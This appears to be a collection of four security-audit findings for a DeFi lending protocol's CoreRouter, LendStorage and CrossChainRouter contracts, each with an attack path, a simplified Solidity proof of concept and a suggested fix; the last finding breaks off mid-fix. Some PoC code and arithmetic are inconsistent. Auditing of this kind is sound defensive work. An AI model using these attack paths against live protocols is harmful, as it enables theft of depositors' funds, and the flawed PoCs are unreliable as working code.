

# Incorrect Liquidity Check Allowing Users to Borrow Beyond Collateral Limits

## Summary

  - **File**: `CoreRouter.sol`
  - **Function**: `borrow(uint256 _amount, address _token)`
  - **Link**: [CoreRouter.sol\#L145-L190](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L145-L190)

-----

## Severity

**High** - This vulnerability allows users to borrow more than their collateral supports, leading to undercollateralized debt positions and potential bad debt for the protocol.

-----

## Description

The `borrow` function in `CoreRouter.sol` contains an **incorrect liquidity check**. It compares the total collateral against only the borrow balance of the specific asset being borrowed, rather than the total borrow amount across all assets. This flaw enables users to borrow amounts that exceed their available collateral when they have existing borrows in other assets.

### Root Cause

In the `borrow` function:
The liquidity check is performed using:

```solidity
require(collateral >= borrowAmount, "Insufficient collateral");
```

Here, `borrowAmount` is calculated as the borrow balance for the specific `_lToken` being borrowed, adjusted by the borrow index, but **it does not include borrows from other assets**.

The correct check should compare the total collateral against the total borrow amount across all assets, including the new borrow.

### Internal Pre-conditions

  - The user has supplied collateral in one or more assets.
  - The user has existing borrows in one or more assets.
  - The user attempts to borrow additional funds from the same or different assets.

### External Pre-conditions

  - None

-----

## Attack Path

An attacker can exploit this to create an undercollateralized debt position as follows:

### Initial Setup

1.  Alice supplies **2,000 DAI** as collateral.
2.  Assuming a collateral factor of **0.8**, the collateral value is 2,000 \* 0.8 = **1,600 USD**.
3.  Alice borrows **1,000 USDC** (assuming 1 USDC = 1 USD), which is within the collateral limit (1,000 \< 1,600).

### Exploit Steps

**Second Borrow Attempt:**

1.  Alice attempts to borrow an additional **500 USDC**.
2.  The protocol calculates:
      - `borrowed` from `getHypotheticalAccountLiquidityCollateral`: existing borrow (1,000) + new borrow (500) = **1,500 USD**.
      - `collateral`: **1,600 USD**.
3.  However, `borrowAmount` in the check only considers the specific asset’s borrow balance, incorrectly set to 500 (new borrow amount), and the check `collateral (1,600) >= borrowAmount (500)` **passes**.

### Result

  - Alice’s total borrow is **1,500 USD**, but her collateral supports only up to 1,600 \* 0.8 = **1,280 USD** borrow limit.
  - Thus, Alice’s position is **undercollateralized** (1,500 \> 1,280).

-----

## Impact

  - **Undercollateralization**: Users can borrow beyond their collateral limits, leading to positions where debt exceeds collateral value.
  - **Bad Debt**: The protocol may incur losses during liquidation if the collateral is insufficient to cover the debt.

-----

## PoC

Below is a runnable PoC using Solidity and Foundry to demonstrate the exploit.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

// Mock Interfaces
interface LTokenInterface {
    function exchangeRateStored() external view returns (uint256);
    function borrowIndex() external view returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function accrueInterest() external;
}

// Vulnerable CoreRouter
contract VulnerableCoreRouter {
    LendStorage public lendStorage;

    constructor(address _lendStorage) {
        lendStorage = LendStorage(_lendStorage);
    }

    function supply(uint256 amount, address underlying) external {
        IERC20(underlying).safeTransferFrom(msg.sender, address(this), amount);
        LToken lToken = lendStorage.underlyingToLToken(underlying);
        lToken.mint(msg.sender, amount);
    }

    function borrow(uint256 _amount, address _token) external {
        address _lToken = lendStorage.underlyingToLToken(_token);
        LTokenInterface(_lToken).accrueInterest();
        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(payable(_lToken)), 0, _amount);
        uint256 borrowAmount = borrowed; // Incorrect: should be total borrow, not just for this asset
        require(collateral >= borrowAmount, "Insufficient collateral");
        require(LTokenInterface(_lToken).borrow(_amount) == 0, "Borrow failed");
        IERC20(_token).transfer(msg.sender, _amount);
    }
}

// Mock LendStorage
contract LendStorage {
    mapping(address => mapping(address => uint256)) public totalInvestment;
    mapping(address => LToken) public underlyingToLToken;

    function underlyingToLToken(address underlying) external view returns (LToken) {
        return underlyingToLToken[underlying];
    }

    function getHypotheticalAccountLiquidityCollateral(address account, LToken lTokenModify, uint256 redeemTokens, uint256 borrowAmount)
        external view returns (uint256, uint256)
    {
        uint256 sumCollateral = 0;
        uint256 sumBorrowPlusEffects = 0;

        // Simplified collateral calculation: assume 0.8 collateral factor
        sumCollateral = (totalInvestment[account][address(lTokenModify)] * 0.8e18) / 1e18;

        // Borrow calculation: only for the specific lToken
        sumBorrowPlusEffects = borrowAmount; // Incorrect: should include all borrows

        return (sumBorrowPlusEffects, sumCollateral);
    }
}

// Mock LToken
contract LToken is LTokenInterface {
    address public underlying;
    mapping(address => uint256) public balanceOf;

    constructor(address _underlying) {
        underlying = _underlying;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function exchangeRateStored() external view override returns (uint256) {
        return 1e18; // 1:1 for simplicity
    }

    function borrowIndex() external view override returns (uint256) {
        return 1e18; // 1:1 for simplicity
    }

    function borrow(uint256 borrowAmount) external override returns (uint256) {
        return 0; // Simplified borrow logic
    }

    function accrueInterest() external override {}
}

// Mock ERC20
contract MockERC20 is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address to, uint256 amount) external override returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract PoC is Test {
    using SafeERC20 for IERC20;

    VulnerableCoreRouter public coreRouter;
    LendStorage public lendStorage;
    LToken public lToken;
    MockERC20 public underlyingToken;
    address public alice = address(0x1);
    uint256 public constant SUPPLY_AMOUNT = 2000 ether;
    uint256 public constant BORROW_AMOUNT_FIRST = 1000 ether;
    uint256 public constant BORROW_AMOUNT_SECOND = 500 ether;

    function setUp() public {
        lendStorage = new LendStorage();
        coreRouter = new VulnerableCoreRouter(address(lendStorage));
        underlyingToken = new MockERC20();
        lToken = new LToken(address(underlyingToken));
        lendStorage.underlyingToLToken[address(underlyingToken)] = lToken;

        // Mint and supply for Alice
        vm.startPrank(alice);
        underlyingToken.mint(alice, SUPPLY_AMOUNT);
        underlyingToken.approve(address(coreRouter), SUPPLY_AMOUNT);
        coreRouter.supply(SUPPLY_AMOUNT, address(underlyingToken));
        vm.stopPrank();
    }

    function testIncorrectLiquidityCheck() public {
        // First borrow: 1000 USDC
        vm.startPrank(alice);
        coreRouter.borrow(BORROW_AMOUNT_FIRST, address(underlyingToken));
        vm.stopPrank();

        // Second borrow: 500 USDC
        vm.startPrank(alice);
        coreRouter.borrow(BORROW_AMOUNT_SECOND, address(underlyingToken));
        vm.stopPrank();

        // Verify undercollateralized state
        uint256 totalBorrow = BORROW_AMOUNT_FIRST + BORROW_AMOUNT_SECOND;
        uint256 collateralValue = (SUPPLY_AMOUNT * 0.8e18) / 1e18;
        assertGt(totalBorrow, collateralValue, "Total borrow should exceed collateral value");
    }
}
```

### Running the PoC

1.  Save the PoC as `IncorrectLiquidityCheckPoC.sol` in a Foundry project’s `test` directory.
2.  Run: `forge test --match-path test/IncorrectLiquidityCheckPoC.sol -vvvv`.
3.  The test demonstrates that Alice can borrow **1,500 USDC** against collateral that only supports up to **1,280 USDC**, confirming the undercollateralization.

-----

## Mitigation

Update the liquidity check to compare the total collateral against the total borrow amount, including the new borrow.

### Suggested Fix

```solidity
// Correct the liquidity check
require(collateral >= borrowed, "Insufficient collateral");
```

Here, `borrowed` should represent the total borrow amount across all assets, including the hypothetical new borrow, as returned by `getHypotheticalAccountLiquidityCollateral`.

#### Why This Works

This ensures that the user’s total borrow does not exceed the collateral’s borrow capacity, maintaining the protocol’s collateralization requirements.




<br>
<br>
<br>




# Uninitialized Borrow State Exploit causing users to create undercollateralized positions using CoreRouter.sol

**Severity**: High

**Location**: `CoreRouter.sol::borrow`

**Link**: [CoreRouter.sol\#L175-L190](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L175-L190)

-----

## Summary

The `borrow` function in **CoreRouter.sol** contains a vulnerability that allows first-time borrowers (where `currentBorrow.borrowIndex == 0`) to bypass proper collateral checks. This occurs because the liquidity check underestimates the borrow amount, setting `borrowAmount` to **0** for new borrows. This enables borrowers to create instantly undercollateralized positions and potentially accumulate bad debt for the protocol.

-----

## Root Cause

The issue arises due to a flaw in how the `borrow` function calculates and verifies collateral against the borrow amount for users borrowing an asset for the first time. Here's a step-by-step breakdown:

### Liquidity Check:

1.  The function calls `lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(payable(_lToken)), 0, _amount)` to evaluate the borrower's existing debt (`borrowed`) and available collateral (`collateral`).
2.  For a first-time borrower of an asset, `lendStorage.getBorrowBalance(msg.sender, _lToken)` returns a `borrowIndex` of **0**, indicating no prior borrow history.

### Borrow Amount Miscalculation:

1.  The `borrowAmount` is calculated as:
    ```solidity
    uint256 borrowAmount = currentBorrow.borrowIndex != 0
        ? ((borrowed * LTokenInterface(_lToken).borrowIndex()) / currentBorrow.borrowIndex)
        : 0;
    ```
2.  When `currentBorrow.borrowIndex == 0`, `borrowAmount` is set to **0**, ignoring the new borrow amount (`_amount`) entirely.

### Flawed Collateral Check:

1.  The collateral check is:
    ```solidity
    require(collateral >= borrowAmount, "Insufficient collateral");
    ```
2.  With `borrowAmount = 0`, this check **always passes** (`collateral >= 0`), regardless of the actual `_amount` being borrowed or the collateral's sufficiency.

### Late State Update:

1.  After the borrow is executed, `lendStorage.updateBorrowBalance` updates the borrower's state with the new borrow amount:
    ```solidity
    lendStorage.updateBorrowBalance(msg.sender, _lToken, _amount, LTokenInterface(_lToken).borrowIndex());
    ```
2.  However, this update occurs **after** the collateral check, meaning the protocol fails to validate the borrow against the collateral beforehand.

-----

## Pre-conditions

### Internal Pre-conditions

  * **First-Time Borrow**: The borrower has no prior borrow history for the asset (`currentBorrow.borrowIndex == 0`).
  * **Non-Zero Borrow Amount**: The requested `_amount` must be greater than 0.
  * **Collateral Supplied**: The borrower has some collateral, though its value is not properly checked.

### External Pre-conditions

  * **Supported Asset**: The token to be borrowed must be supported by the protocol with a valid `_lToken`.
  * **Liquidity Availability**: The protocol must have sufficient liquidity to process the borrow.

-----

## Attack Path ⚔️

1.  **Setup**: Alice supplies **1,000 DAI** as collateral (valued at **800 USD** due to a collateral factor or price difference).
2.  **Action**: Alice borrows **800 USDC** for the first time.
3.  **Execution**:
      * `getHypotheticalAccountLiquidityCollateral` returns:
          * `borrowed` = 0 (no prior borrows).
          * `collateral` = 800 USD.
      * Since `currentBorrow.borrowIndex == 0`, `borrowAmount` is set to **0**.
      * The check `800 >= 0` passes, allowing the borrow of **800 USDC**.
4.  **Result**: Alice’s position is instantly **undercollateralized** (800 USD debt vs. 800 USD collateral, assuming parity), violating the protocol's intended collateralization requirements.

-----

## Impact

  * **User Loss**: Allows first-time borrowers to bypass proper collateral validation, leading to undercollateralized positions and potential bad debt for the protocol.

-----

## Proof of Concept (PoC)

Below is a runnable Solidity PoC demonstrating the exploit. It includes simplified mock contracts and a test scenario replicating the vulnerability.

```solidity
pragma solidity 0.8.23;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
}

interface LTokenInterface {
    function accrueInterest() external;
    function borrowIndex() external view returns (uint256);
}

interface LErc20Interface {
    function borrow(uint256 amount) external returns (uint256);
}

contract LendStorageMock {
    mapping(address => mapping(address => BorrowMarketState)) public borrowBalances;

    struct BorrowMarketState {
        uint256 amount;
        uint256 borrowIndex;
    }

    function getBorrowBalance(address user, address lToken) external view returns (BorrowMarketState memory) {
        return borrowBalances[user][lToken];
    }

    function updateBorrowBalance(address user, address lToken, uint256 amount, uint256 borrowIndex) external {
        borrowBalances[user][lToken] = BorrowMarketState(amount, borrowIndex);
    }

    function addUserBorrowedAsset(address user, address lToken) external {}

    function distributeBorrowerLend(address lToken, address user) external {}

    function getHypotheticalAccountLiquidityCollateral(address user, address lToken, uint256 redeemTokens, uint256 borrowAmount)
        external view returns (uint256 borrowed, uint256 collateral) {
        // Mock: 800 USD collateral, 0 borrowed for first-time borrow
        return (0, 800e18); // 800 USD in 18-decimal format
    }

    function underlyingTolToken(address underlying) external view returns (address) {
        return underlying; // Simplified mapping
    }
}

contract LTokenMock is LTokenInterface, LErc20Interface {
    uint256 public override borrowIndex = 1e18; // Initial borrow index

    function borrow(uint256 amount) external override returns (uint256) {
        return 0; // Success
    }

    function accrueInterest() external override {}
}

contract CoreRouter {
    LendStorageMock public lendStorage;
    address public lToken;
    address public token;

    event BorrowSuccess(address indexed user, address lToken, uint256 amount);

    constructor(address _lendStorage, address _lToken, address _token) {
        lendStorage = LendStorageMock(_lendStorage);
        lToken = _lToken;
        token = _token;
    }

    function enterMarkets(address _lToken) internal {}

    function borrow(uint256 _amount, address _token) external {
        require(_amount != 0, "Zero borrow amount");
        address _lToken = lendStorage.underlyingTolToken(_token);
        LTokenMock(_lToken).accrueInterest();

        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, _lToken, 0, _amount);

        LendStorageMock.BorrowMarketState memory currentBorrow = lendStorage.getBorrowBalance(msg.sender, _lToken);

        uint256 borrowAmount = currentBorrow.borrowIndex != 0
            ? ((borrowed * LTokenMock(_lToken).borrowIndex()) / currentBorrow.borrowIndex)
            : 0;

        require(collateral >= borrowAmount, "Insufficient collateral");

        enterMarkets(_lToken);

        require(LTokenMock(_lToken).borrow(_amount) == 0, "Borrow failed");

        // IERC20(_token).transfer(msg.sender, _amount); // Mocked transfer

        lendStorage.distributeBorrowerLend(_lToken, msg.sender);

        uint256 currentBorrowIndex = LTokenMock(_lToken).borrowIndex();
        if (currentBorrow.borrowIndex != 0) {
            uint256 _newPrinciple = (currentBorrow.amount * currentBorrowIndex) / currentBorrow.borrowIndex;
            lendStorage.updateBorrowBalance(msg.sender, _lToken, _newPrinciple + _amount, currentBorrowIndex);
        } else {
            lendStorage.updateBorrowBalance(msg.sender, _lToken, _amount, currentBorrowIndex);
        }

        lendStorage.addUserBorrowedAsset(msg.sender, _lToken);

        emit BorrowSuccess(msg.sender, _lToken, lendStorage.getBorrowBalance(msg.sender, _lToken).amount);
    }
}

contract PoC_Test {
    LendStorageMock public lendStorage;
    LTokenMock public lToken;
    address public token;
    CoreRouter public router;
    address public alice = address(0x1);

    constructor() {
        lendStorage = new LendStorageMock();
        lToken = new LTokenMock();
        token = address(0x2);
        router = new CoreRouter(address(lendStorage), address(lToken), token);
    }

    function test_UninitializedBorrowExploit() external {
        vm.startPrank(alice);
        // Alice borrows 800 USDC with 800 USD collateral
        router.borrow(800e6, token); // 800 USDC in 6-decimal format
        vm.stopPrank();

        uint256 recordedBorrow = lendStorage.getBorrowBalance(alice, address(lToken)).amount;
        assert(recordedBorrow == 800e6); // Borrow succeeds despite insufficient collateral check
    }
}
```

### PoC Explanation

1.  **Setup**: Alice has **800 USD** worth of collateral and attempts to borrow **800 USDC** for the first time.
2.  **Execution**: The `borrow` function sets `borrowAmount = 0` due to `currentBorrow.borrowIndex == 0`, and the check `collateral >= 0` (800 \>= 0) passes, allowing the borrow.
3.  **Outcome**: Alice successfully borrows 800 USDC, creating an undercollateralized position.

-----

## Mitigation 

To fix this vulnerability:

  * **Include New Borrow in Check**: Modify the collateral check to account for the new borrow amount (`_amount`) in addition to any existing debt.
  * **Accurate Total Borrow**: Ensure the check reflects the total borrow post-transaction.

### Proposed Fix

```solidity
function borrow(uint256 _amount, address _token) external {
    require(_amount != 0, "Zero borrow amount");
    address _lToken = lendStorage.underlyingTolToken(_token);
    LTokenInterface(_lToken).accrueInterest();

    (uint256 borrowed, uint256 collateral) =
        lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(payable(_lToken)), 0, _amount);

    LendStorage.BorrowMarketState memory currentBorrow = lendStorage.getBorrowBalance(msg.sender, _lToken);

    // Calculate total borrow including the new amount
    uint256 totalBorrow = borrowed + _amount;

    // Check against total borrow
    require(collateral >= totalBorrow, "Insufficient collateral");

    // Proceed with borrow logic...
}
```



<br>
<br>
<br>




# Underreporting of Cross-Chain Borrows Leading to Incorrect Liquidity Calculations

### High

---

## Summary

**Affected Components**

* **File**: `LendStorage.sol`
    * **Function**: `borrowWithInterest(address borrower, address _lToken)`
    * **Logic Flaw**: Excludes valid cross-chain borrows where `srcEid != currentEid` but `destEid == currentEid`.
    * [https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/LendStorage.sol#L478-L504](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/LendStorage.sol#L478-L504)

* **File**: `LendStorage.sol`
    * **Function**: `getHypotheticalAccountLiquidityCollateral(address account, LToken lTokenModify, uint256 redeemTokens, uint256 borrowAmount)`
    * **Impact**: Uses flawed `borrowWithInterest` output, leading to underreported borrow totals.
    * [https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/LendStorage.sol#L385-L441](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/LendStorage.sol#L385-L441)

---

## Severity

**High** - This vulnerability enables users to redeem collateral while concealing cross-chain debts, potentially resulting in undercollateralized positions and significant financial losses for the protocol.

---

## Description

The `borrowWithInterest` function in `LendStorage.sol` fails to account for cross-chain borrows that originate on a different chain (`srcEid != currentEid`) but are owed on the current chain (`destEid == currentEid`). This leads to an underreported total borrow amount when `getHypotheticalAccountLiquidityCollateral` assesses a user’s liquidity. Consequently, users can redeem collateral or perform actions that should be prohibited due to insufficient collateral, creating undercollateralized debt positions.

---

## Root Cause

In `borrowWithInterest`:

* The condition `collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid` only counts borrows originated and owed on the current chain.
* Cross-chain borrows where the debt is owed on the current chain (`destEid == currentEid`) but originated elsewhere (`srcEid != currentEid`) are excluded.

In `getHypotheticalAccountLiquidityCollateral`:

* The borrow total relies on `borrowWithInterest`, inheriting its underreporting flaw, which inflates the perceived collateral-to-borrow ratio.

---

## Internal Pre-conditions

* The protocol supports cross-chain operations.

---

## External Pre-conditions

* A user has a borrow initiated on one chain (`srcEid != currentEid`) with repayment due on the current chain (`destEid == currentEid`).
* The user attempts a collateral redemption or liquidity-dependent action on the debt-owing chain.

---

## Attack Path

An attacker can exploit this by redeeming collateral while hiding cross-chain debts. Example:

### Setup

* **Chain A**: User borrows 10 tokens, owed on Chain B.
* **Chain B**: User supplies collateral worth 20 tokens and borrows 5 tokens locally.

### Steps

1.  **Borrow on Chain A**:
    * User borrows 10 tokens, recorded in `crossChainCollaterals` on Chain B with `srcEid` = Chain A, `destEid` = Chain B.
2.  **Redeem on Chain B**:
    * User attempts to redeem 10 tokens of collateral.
    * `getHypotheticalAccountLiquidityCollateral` calls `borrowWithInterest`.
    * `borrowWithInterest` counts only the local 5-token borrow (since `srcEid != currentEid` for the 10-token debt), reporting total debt as 5 tokens instead of 15.

### Outcome:

* Liquidity check passes (collateral 20 > debt 5), allowing redemption.
* Post-redemption, collateral = 10, debt = 15, resulting in an undercollateralized position.

---

## Impact

* **Undercollateralization**: Debt exceeds collateral, risking bad debt.
* **Protocol Losses**: Liquidation may not recover full debt, causing financial loss.

---

## PoC

Below is a runnable PoC using Solidity and Foundry to validate the issue.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface LTokenInterface {
    function borrowIndex() external view returns (uint256);
}

contract VulnerableLendStorage {
    uint256 public currentEid = 1; // Chain B
    mapping(address => mapping(address => Borrow[])) public crossChainBorrows;
    mapping(address => mapping(address => Borrow[])) public crossChainCollaterals;

    struct Borrow {
        uint256 srcEid;
        uint256 destEid;
        uint256 principle;
        uint256 borrowIndex;
    }

    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
        address _token = _lToken; // Simplified for PoC
        uint256 borrowedAmount;
        Borrow[] memory borrows = crossChainBorrows[borrower][_token];
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];

        if (borrows.length > 0) {
            for (uint256 i = 0; i < borrows.length; i++) {
                if (borrows[i].srcEid == currentEid) {
                    borrowedAmount += (borrows[i].principle * LTokenInterface(_lToken).borrowIndex()) / borrows[i].borrowIndex;
                }
            }
        } else {
            for (uint256 i = 0; i < collaterals.length; i++) {
                if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid) {
                    borrowedAmount += (collaterals[i].principle * LTokenInterface(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
                }
            }
        }
        return borrowedAmount;
    }
}

contract MockLToken is LTokenInterface {
    function borrowIndex() external view override returns (uint256) {
        return 1e18; // 1:1 interest for simplicity
    }
}

contract PoC is Test {
    VulnerableLendStorage public lendStorage;
    MockLToken public lToken;
    address public borrower = address(0x123);
    address public token = address(0x456);

    function setUp() public {
        lendStorage = new VulnerableLendStorage();
        lToken = new MockLToken();

        // Cross-chain borrow: Chain A (srcEid=0) to Chain B (destEid=1)
        VulnerableLendStorage.Borrow memory crossBorrow = VulnerableLendStorage.Borrow({
            srcEid: 0,
            destEid: 1,
            principle: 10 ether,
            borrowIndex: 1e18
        });
        lendStorage.crossChainCollaterals[borrower][token].push(crossBorrow);

        // Local borrow on Chain B
        VulnerableLendStorage.Borrow memory localBorrow = VulnerableLendStorage.Borrow({
            srcEid: 1,
            destEid: 1,
            principle: 5 ether,
            borrowIndex: 1e18
        });
        lendStorage.crossChainBorrows[borrower][token].push(localBorrow);
    }

    function testBorrowUnderreporting() public {
        uint256 totalBorrow = lendStorage.borrowWithInterest(borrower, address(lToken));
        assertEq(totalBorrow, 5 ether, "Total borrow should only include local borrow, missing cross-chain debt");
    }
}
````

-----

## Running the PoC

  * **Requirements**: Foundry installed (forge).
  * **Steps**:
    1.  Save the PoC as `CrossChainBorrowUnderreportingPoC.sol` in a Foundry project’s test directory.
    2.  Run: `forge test --match-path test/CrossChainBorrowUnderreportingPoC.sol -vvvv`.
  * The test confirms that `borrowWithInterest` reports only 5 ether (local borrow), ignoring the 10 ether cross-chain borrow.

-----

## Mitigation

Update `borrowWithInterest` to include all borrows owed on the current chain (`destEid == currentEid`), regardless of origin.

### Suggested Fix

```solidity
if (collaterals[i].destEid == currentEid) {
    borrowedAmount += (collaterals[i].principle * LTokenInterface(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
}
```

### Why It Works

This ensures all debts repayable on the current chain are counted, aligning liquidity calculations with actual obligations.




<br>
<br>
<br>



# Liquidator Does Not Repay Debt on Chain B, Yet Receives Collateral from Chain A

### Severity
**High**

### Location
[CrossChainRouter.sol::liquidateCrossChain](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L172-L192)

---

## Description
The `liquidateCrossChain` function enables a liquidator to trigger a cross-chain liquidation without transferring the `repayAmount` of the borrowed asset to the protocol on Chain B. As a result, the borrower's collateral is seized on Chain A, but their debt on Chain B remains unchanged, allowing the liquidator to effectively steal collateral without cost.

The `liquidateCrossChain` function facilitates cross-chain liquidations where a borrower’s debt resides on Chain B and their collateral on Chain A. It calculates the `seizeTokens` to be seized from Chain A and sends a message to execute this seizure. However, it has critical flaws:

* **No Fund Transfer**: It does not require the liquidator to transfer the `repayAmount` of the `borrowedAsset` to the protocol on Chain B.
* **No Debt Reduction**: It fails to reduce the borrower’s debt on Chain B using the `repayAmount`.
* **No Storage Update**: The borrower’s `crossChainCollaterals` record is not updated to reflect any repayment.

### Root Cause
* The `_executeLiquidation` function calculates the `maxLiquidation` based on the borrower’s debt but does not enforce the transfer of `repayAmount` from the liquidator.
* The `_executeLiquidationCore` function computes `seizeTokens` and sends a message to Chain A without verifying or applying repayment on Chain B.

### Internal Pre-conditions
None.

### External Pre-conditions
None.

---

## Attack Path
1.  **Borrower (Bob)**: Borrows 1,000 USDC on Chain B, secured by lDAI on Chain A.
2.  **Liquidator (Dave)**: Calls `liquidateCrossChain` with `repayAmount` = 400 USDC.
3.  **Current Behavior**:
    * `seizeTokens` is calculated based on `repayAmount`.
    * A message is sent to Chain A, and Dave receives the collateral.
    * No USDC is transferred from Dave to the protocol on Chain B.
    * Bob’s debt remains 1,000 USDC on Chain B.
4.  **Result**: Dave gains collateral for free, and Bob’s debt persists, enabling repeated exploitation.

---

## Impact
* **Theft of Collateral**: Liquidators can freely drain collateral from borrowers without repaying debt.
* **Unchanged Debt**: Borrowers lose collateral but their debt remains, leading to unfair losses.
* **Protocol Insolvency**: The system accrues bad debt since liquidations don't reduce liabilities.

---

## PoC
The PoC below simulates the vulnerability in a simplified `CrossChainRouter` setup. It shows a liquidator seizing collateral without transferring funds or reducing the borrower’s debt.

```solidity
pragma solidity 0.8.23;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract LTokenMock {
    uint256 public borrowIndex;
    constructor() {
        borrowIndex = 1e18; // Initial borrow index (1.0)
    }
    function accrueInterest() external {
        borrowIndex = borrowIndex * 11 / 10; // Simulate 10% interest
    }
    function repayBorrowBehalf(address borrower, uint256 repayAmount) external {}
}

contract CrossChainRouterPoC {
    LTokenMock public borrowedlToken;
    uint256 public constant CLOSE_FACTOR = 4e17; // 40%

    struct LiquidationParams {
        address borrower;
        uint256 repayAmount;
        uint32 srcEid;
        address lTokenToSeize;
        address borrowedAsset;
        uint256 storedBorrowIndex;
        uint256 borrowPrinciple;
        address borrowedlToken;
    }

    mapping(address => mapping(address => uint256)) public crossChainBorrows;

    constructor(address _borrowedlToken) {
        borrowedlToken = LTokenMock(_borrowedlToken);
    }

    function setupBorrow(address borrower, uint256 borrowAmount) external {
        crossChainBorrows[borrower][address(borrowedlToken)] = borrowAmount;
    }

    function liquidateCrossChain(
        address borrower,
        uint256 repayAmount,
        uint32 srcEid,
        address lTokenToSeize,
        address borrowedAsset
    ) external {
        LiquidationParams memory params = LiquidationParams({
            borrower: borrower,
            repayAmount: repayAmount,
            srcEid: srcEid,
            lTokenToSeize: lTokenToSeize,
            borrowedAsset: borrowedAsset,
            storedBorrowIndex: 1e18,
            borrowPrinciple: crossChainBorrows[borrower][address(borrowedlToken)],
            borrowedlToken: address(borrowedlToken)
        });

        _validateAndPrepareLiquidation(params);
        _executeLiquidation(params);
    }

    function _validateAndPrepareLiquidation(LiquidationParams memory params) private view {
        require(params.borrower != msg.sender, "Liquidator cannot be borrower");
        require(params.repayAmount > 0, "Repay amount cannot be zero");
    }

    function _executeLiquidation(LiquidationParams memory params) private {
        uint256 maxLiquidation = _prepareLiquidationValues(params);
        require(params.repayAmount <= maxLiquidation, "Exceeds max liquidation");
        _executeLiquidationCore(params);
    }

    function _prepareLiquidationValues(LiquidationParams memory params) private returns (uint256) {
        borrowedlToken.accrueInterest();
        uint256 currentBorrowIndex = borrowedlToken.borrowIndex();
        uint256 currentBorrow = (params.borrowPrinciple * currentBorrowIndex) / params.storedBorrowIndex;
        return (currentBorrow * CLOSE_FACTOR) / 1e18;
    }

    function _executeLiquidationCore(LiquidationParams memory params) private {
        uint256 seizeTokens = params.repayAmount * 2; // Simplified for PoC
        emit LiquidationExecuted(params.borrower, seizeTokens);
    }

    event LiquidationExecuted(address borrower, uint256 seizeTokens);

    function getBorrowBalance(address borrower) external view returns (uint256) {
        return crossChainBorrows[borrower][address(borrowedlToken)];
    }
}

contract PoC_Test {
    CrossChainRouterPoC public router;
    LTokenMock public lToken;

    constructor() {
        lToken = new LTokenMock();
        router = new CrossChainRouterPoC(address(lToken));
    }

    function test_NoRepayment() external {
        address bob = address(0x1);
        address dave = address(0x2);

        // Bob borrows 1,000 USDC on Chain B
        router.setupBorrow(bob, 1000e18);

        // Dave liquidates 400 USDC of Bob's debt
        vm.startPrank(dave);
        router.liquidateCrossChain(bob, 400e18, 1, address(0x3), address(0x4));
        vm.stopPrank();

        // Verify Bob's debt remains unchanged
        uint256 borrowBalanceAfter = router.getBorrowBalance(bob);
        assert(borrowBalanceAfter == 1000e18);
    }
}
````

### PoC Explanation

  * **Setup**: Bob borrows 1,000 USDC on Chain B.
  * **Liquidation**: Dave calls `liquidateCrossChain` with `repayAmount` = 400 USDC.
  * **Outcome**:
      * `seizeTokens` is calculated, simulating collateral seizure on Chain A.
      * No funds are transferred from Dave, and Bob’s debt stays at 1,000 USDC.
  * **Exploit**: Dave gains collateral without cost, and Bob’s debt persists.

-----

## Mitigation

To fix this vulnerability:

1.  **Require Fund Transfer**: Mandate the liquidator to transfer `repayAmount` of `borrowedAsset` to the contract on Chain B using `safeTransferFrom`.
2.  **Repay Debt**: Use these funds to call `repayBorrowBehalf` on the `borrowedlToken` to reduce the borrower’s debt.
3.  **Update Records**: Adjust the borrower’s `crossChainCollaterals` to reflect the repayment.

### Proposed Fix

```solidity
function liquidateCrossChain(
    address borrower,
    uint256 repayAmount,
    uint32 srcEid,
    address lTokenToSeize,
    address borrowedAsset
) external {
    LendStorage.LiquidationParams memory params = LendStorage.LiquidationParams({
        borrower: borrower,
        repayAmount: repayAmount,
        srcEid: srcEid,
        lTokenToSeize: lTokenToSeize,
        borrowedAsset: borrowedAsset,
        storedBorrowIndex: 0,
        borrowPrinciple: 0,
        borrowedlToken: address(0)
    });

    // Transfer repayAmount from liquidator
    IERC20(borrowedAsset).transferFrom(msg.sender, address(this), repayAmount);

    _validateAndPrepareLiquidation(params);

    // Repay borrow on Chain B
